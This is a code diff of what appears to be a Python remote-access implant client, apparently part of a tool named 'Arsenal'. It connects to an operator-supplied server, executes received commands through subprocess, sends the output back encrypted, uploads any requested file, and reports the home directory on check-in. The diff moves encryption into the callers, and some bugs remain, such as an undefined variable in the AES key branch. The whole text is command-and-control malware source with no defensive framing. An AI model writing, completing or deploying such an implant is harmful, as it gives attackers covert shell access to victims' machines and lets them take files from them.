@@ -38,9 +38,7 @@ def get_data(conn, buff):
         data += conn.recv(buff if to_read > buff else to_read)
     return data
 
-def sendit(conn, output):
-    message = do_encrypt(output)
-    print(message)
+def sendit(conn, message):
     length = struct.pack('>Q', len(message))
     conn.sendall(length)
     conn.sendall(message)
@@ -54,24 +52,24 @@ def main():
     conn.connect((args.server, args.port))
     while True:
         try:
-            received = do_decrypt(get_data(conn))
+            received = do_decrypt(get_data(conn, buff))
             command = [ str(x, 'utf-8') for x in received ]
             if 'cmd' in command:
                 del command[0]
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-                sendit(conn, output.stdout)
+                sendit(conn, do_encrypt(output.stdout))
             elif 'Arsenal' in command:
-                sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
+                sendit(conn, do_encrypt('Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME')))
             elif 'get_file' in command:
                 with open(command[1]) as f:
                     tmp = f.read()
-                sendit(conn, bytes(tmp))
+                sendit(conn, do_encrypt(bytes(tmp)))
             elif 'aeskey' in command:
                 message = ast.literal_eval(message)
                 print(message)
                 aeskey = message[1]
                 aesiv = message[2]
-                sendit(conn, 'Updated AES key\n')
+                sendit(conn, do_encrypt('Updated AES key\n'))
         except socket.error as err:
             print("{0}\n".format(err))
     return
